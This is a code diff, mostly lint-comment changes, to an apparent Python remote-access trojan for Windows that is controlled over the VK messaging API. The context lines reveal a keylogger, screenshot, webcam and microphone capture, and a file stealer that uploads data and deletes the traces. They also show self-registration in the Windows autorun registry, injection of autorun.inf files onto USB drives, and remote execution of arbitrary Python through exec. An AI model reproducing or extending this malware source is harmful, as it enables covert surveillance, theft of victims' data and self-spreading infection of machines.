@@ -237,13 +237,13 @@ def load_name() -> None:
 
                 # Reading completed.
                 return
-            except Exception as exception:  # noqa
+            except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
                 # If there is exception occurred.
 
                 # Debug message.
                 debug_message(f"[Name] Failed to load name! Exception - {exception}")
 
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -256,7 +256,7 @@ def load_name() -> None:
     save_name()
 
     # Message.
-    debug_message(f"[Name] Name was set to default during loading (can`t read)")
+    debug_message("[Name] Name was set to default during loading (can`t read)")
 
 
 def save_name() -> None:
@@ -276,7 +276,7 @@ def save_name() -> None:
 
             # Writing name.
             name_file.write(str(CLIENT_NAME))
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Error.
@@ -324,7 +324,7 @@ def drive_inject_autorun_executable(drive: str) -> None:
 
                 # Writing.
                 autorun_file.write(f"[AutoRun]\nopen={executable_path}\n\naction=Autorun\\Autorun")
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Error.
@@ -373,7 +373,7 @@ def drives_watching_thread() -> None:
 
             # Updating current drives.
             current_drives = filesystem_get_drives_list()
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Error.
@@ -406,7 +406,7 @@ def command_screenshot(*_) -> CommandResult:
         # Trying to import.
 
         # Importing.
-        import PIL.ImageGrab
+        import PIL.ImageGrab  # pylint: disable=import-outside-toplevel
     except ImportError:
         # If there is import error.
 
@@ -437,7 +437,7 @@ def command_webcam(_arguments, _event) -> CommandResult:
         # Trying to import opencv-python.
 
         # Importing.
-        import cv2
+        import cv2 # pylint: disable=import-outside-toplevel
     except ImportError:
         # If there is import error.
 
@@ -478,8 +478,8 @@ def command_microphone(arguments, _) -> CommandResult:
         # Trying to import modules.
 
         # Importing.
-        import pyaudio
-        import wave
+        import pyaudio # pylint: disable=import-outside-toplevel
+        import wave  # pylint: disable=import-outside-toplevel
     except ImportError:
         # If there is import error.
 
@@ -561,7 +561,7 @@ def command_message(arguments: str, _) -> CommandResult:
         # Trying to import module.
 
         # Importing module.
-        import ctypes
+        import ctypes  # pylint: disable=import-outside-toplevel
     except ImportError:
         # If there is import error.
 
@@ -603,7 +603,7 @@ def command_message(arguments: str, _) -> CommandResult:
             args=(0, *message_parameters)
         ).start()
 
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is error.
 
         # Message.
@@ -985,7 +985,7 @@ def command_link(arguments, _) -> CommandResult:
             # Trying to open with the module.
 
             # Importing module.
-            import webbrowser  # noqa
+            import webbrowser  # noqa, pylint: disable=import-outside-toplevel
 
             # Opening link.
             webbrowser.open(arguments[0])
@@ -1074,7 +1074,7 @@ def command_python(arguments, _) -> CommandResult:
 
         # Executing code.
         exec(python_source_code, globals(), None)
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is an error.
 
         # Returning.
@@ -1386,7 +1386,7 @@ def process_message(event) -> None:
 
                 # Returning.
                 return
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there an exception.
 
         # Getting exception answer.
@@ -1430,7 +1430,7 @@ def keylogger_start() -> None:
         # Trying to import keyboard module which is not preinstalled.
 
         # Importing keyboard module.
-        import keyboard
+        import keyboard  # pylint: disable=import-outside-toplevel
     except ImportError:
         # If there is ImportError occurred.
 
@@ -1496,7 +1496,7 @@ def keylogger_callback_event(keyboard_event):
 
                 # Adding key (char) to the keylogger string.
                 KEYLOGGER_BUFFER += keyboard_key
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1534,9 +1534,9 @@ def server_connect() -> None:
 
             # Importing longpoll.
             if server_type == "VK_GROUP":
-                import vk_api.bot_longpoll
+                import vk_api.bot_longpoll  # pylint: disable=import-outside-toplevel
             else:
-                import vk_api.longpoll
+                import vk_api.longpoll  # pylint: disable=import-outside-toplevel
 
             # Connect to the VK API.
             SERVER_API = vk_api.VkApi(token=access_token)
@@ -1559,7 +1559,7 @@ def server_connect() -> None:
             debug_message(f"[Server] Failed to connect with current server type, "
                           f"as it may be not implemented / exists. Server type - {server_type}")
             sys.exit(1)
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Error.
@@ -1619,7 +1619,7 @@ def server_listen() -> None:
                         # Processing client-server answer.
                         process_message(event)
 
-            except Exception as exception:  # noqa
+            except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
                 # If there is exception occurred.
 
                 # Error.
@@ -1653,7 +1653,7 @@ def server_method(method: str, parameters: typing.Dict, is_retry=False) -> typin
 
         # Executing method.
         return SERVER_API.method(method, parameters)  # noqa
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # Error.
 
         # Message.
@@ -1774,7 +1774,7 @@ def server_upload_document(path: str, title: str, peer: int, document_type: str 
 
         # Returning request as error.
         return False, "Request Error" + str(request)
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is error.
 
         # Debug message.
@@ -1888,7 +1888,7 @@ def filesystem_build_path(path: str) -> None:
 
             # Making directories.
             os.makedirs(path)
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -1905,7 +1905,7 @@ def filesystem_get_drives_list() -> typing.List:
         # Returning list.
         return [f"{drive_letter}:\\\\" for drive_letter in drives_letters
                 if os.path.exists(f"{drive_letter}:\\\\")]
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Error.
@@ -1972,7 +1972,7 @@ def load_tags() -> None:
 
                     # Reading tags.
                     CLIENT_TAGS = json.loads(tags_file.read())["tags"]
-            except Exception as exception:  # noqa
+            except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
                 # If there is exception occurred.
 
                 # Debug message.
@@ -1988,7 +1988,7 @@ def load_tags() -> None:
 
             # Reset tags.
             reset_tags()
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -2027,7 +2027,7 @@ def save_tags() -> None:
             tags_file.write(json.dumps({
                 "tags": CLIENT_TAGS
             }))
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -2094,7 +2094,7 @@ def get_hwid() -> str:
 
         # Returning HWID.
         return str((process.stdout.read() + process.stderr.read()).decode().split("\n")[1])
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -2115,7 +2115,7 @@ def get_ip() -> typing.Dict:
 
         # Returning JSON data.
         return requests.get(api_provider).json()
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Showing debug message to the developer.
@@ -2476,7 +2476,7 @@ def stealer_steal_all(force: bool = False) -> None:
 
             # Try to delete file after uploading.
             filesystem_try_delete(path)
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Error.
@@ -2616,7 +2616,7 @@ def autorun_register() -> None:
         # Trying to import winreg module.
 
         # Importing.
-        import winreg
+        import winreg  # pylint: disable=import-outside-toplevel
     except ImportError:
         # If there is ImportError.
 
@@ -2659,7 +2659,7 @@ def autorun_register() -> None:
 
         # Debug message.
         debug_message("[Autorun] Successfully regitering self to the registry!")
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If error occurred.
 
         # Debug message.
@@ -2697,7 +2697,7 @@ def autorun_unregister() -> None:
         # Trying to import winreg module.
 
         # Importing.
-        import winreg
+        import winreg  # pylint: disable=import-outside-toplevel
     except ImportError:
         # If there is ImportError.
 
@@ -2720,7 +2720,7 @@ def autorun_unregister() -> None:
 
         # Closing key.
         winreg.CloseKey(registry_key)
-    except Exception as exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If error occurred.
 
         # Debug message.
@@ -2870,11 +2870,11 @@ def launch() -> None:
 
         # Starting listening messages.
         server_listen()
-    except Exception as launch_exception:  # noqa
+    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         # If there is exception occurred.
 
         # Error.
-        debug_message(f"[Launch] Failed to launch! Exception - {launch_exception}")
+        debug_message(f"[Launch] Failed to launch! Exception - {exception}")
         sys.exit(1)
 
 
